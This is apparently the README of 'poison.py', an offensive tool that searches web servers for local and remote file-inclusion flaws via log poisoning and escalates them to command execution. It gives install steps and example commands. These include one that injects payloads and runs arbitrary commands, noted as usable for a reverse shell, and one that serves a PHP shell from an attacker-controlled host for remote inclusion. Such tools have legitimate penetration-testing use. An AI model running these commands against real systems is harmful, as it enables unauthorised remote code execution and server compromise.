# poison.py
Fast tool to search accessible log's files for LFI/RFI vulnerabilities, and automatic escalation to shell
all the wordlists and payloads is included

## Exploitation:
![Preview](https://github.com/user-attachments/assets/8d658876-79d6-41f1-9456-91681be9782e)


## Installation:
```
git clone https://github.com/coldt3ars/poison
cd poison
pip install -r requirements.txt
python3 poison.py
```
## Example usage (LFI):
```
./poison.py -u 'http://127.0.0.1/file.php?file=' -e 'id' -p src/payloads.txt -w src/small.txt
```
_____________________________________________________________________________________________
```
-u 'http://127.0.0.1/file.php?file=' # URL for poison the log
```

```
-e 'id' # Command to execute (In this time, command is id) (this option can be used for rev. shell)
```

```
-p src/payloads.txt # list of paylods during the poisoning
```

```
-w src/small.txt # wordlist using the search for available log's file
```
## Example usage (RFI):
```
/poison.py -u 'http://127.0.0.1/index.php?page=' --rfi --lhost 10.10.10.10 --rhost 127.0.0.1 --rport 14852 --lfile 'src/shell.php' -e 'id' --cookie 'PHPSESSID=1234567890'
```

--rfi # Remote File Inclusion option

```
--lhost 10.10.10.10 # which network interface to bind the local HTTP server to (necesssary only on remote explotiation)
```

```
-rhost 127.0.0.1 # remote-ip-address of http-server in request during the RFI
```

```
--rport 14852 # remote-port of http-server in request during the RFI
```

```
--lfile 'src/shell.php' # payload which include in the request during the RFI
```

```
-e 'id' # command for src/shell.php 
```

```
--cookie 'PHPSESSID=1234567890' # cookie for authorized requests
```

# ToDo list:
-   [x] Add the function with command execution
-   [x] Add the support of wordlist's
-   [ ] Add different injection endpoints (Headers)
-   [ ] Interactive shell 
-   [X] Add the function for RFI
